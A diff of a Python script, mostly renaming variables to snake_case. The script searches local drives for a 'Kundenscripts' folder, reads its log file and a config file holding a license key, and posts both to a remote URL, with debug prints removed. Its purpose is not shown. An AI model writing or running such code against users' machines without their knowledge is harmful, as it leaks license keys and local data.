@@ -22,52 +22,49 @@ def search_files(dir: str, counter: int = 0):
     counter (int): helper variable for recursive function call with another root directory
     """
     global URL
-    abspathLog    = ""
-    abspathConfig = ""
+    abspath_log    = ""
+    abspath_config = ""
 
     if counter == 2:
         return
 
     for root, dirs, files in os.walk(dir):
-        print(root)
         if os.path.basename(root) != 'Kundenscripts':
             continue
 
-        abspathLog    = str(files[files.index('LOG.txt')])
-        abspathConfig = str(files[files.index('config.txt')])
-        path          = open("./path.txt", "w")
+        abspath_log    = str(files[files.index('LOG.txt')])
+        abspath_config = str(files[files.index('config.txt')])
+        path           = open("./path.txt", "w")
         path.write(os.path.abspath(root))
         path.close()
         break
 
-    if not abspathLog and not abspathConfig:
+    if not abspath_log and not abspath_config:
         search_files("D:/", counter + 1)
 
-    PARAMS = read_data(str(os.path.abspath(root)), abspathLog, abspathConfig)
-    print(PARAMS)
+    PARAMS = read_data(str(os.path.abspath(root)), abspath_log, abspath_config)
 
     requests.post(url=URL, data=PARAMS)
 
-def read_data(dir: str, abspathLog: str, abspathConfig: str):
+def read_data(dir: str, abspath_log: str, abspath_config: str):
     """
     Reads data of 'config.txt' and 'LOG.txt' and returns it.
 
     Parameters:
-    dir           (str): directory to get data from
-    abspathLog    (str): log file
-    abspathConfig (str): config file with license key within
+    dir            (str): directory to get data from
+    abspath_log    (str): log file
+    abspath_config (str): config file with license key within
 
     Returns:
     dict: data
     """
-    if not dir or not abspathLog or not abspathConfig:
+    if not dir or not abspath_log or not abspath_config:
         return None
 
-    abspathLog    = dir + "\\" + abspathLog
-    abspathConfig = dir + "\\" + abspathConfig
-    print(abspathLog + "      " + abspathConfig)
+    abspath_log    = dir + "\\" + abspath_log
+    abspath_config = dir + "\\" + abspath_config
 
-    log     = open(abspathLog, "r")
+    log     = open(abspath_log, "r")
     message = str(log.read())
     log.close()
 
@@ -77,7 +74,7 @@ def read_data(dir: str, abspathLog: str, abspathConfig: str):
     except:
         message = ''
 
-    config = open(abspathConfig, "r")
+    config  = open(abspath_config, "r")
     license = config.read()
     config.close()
 
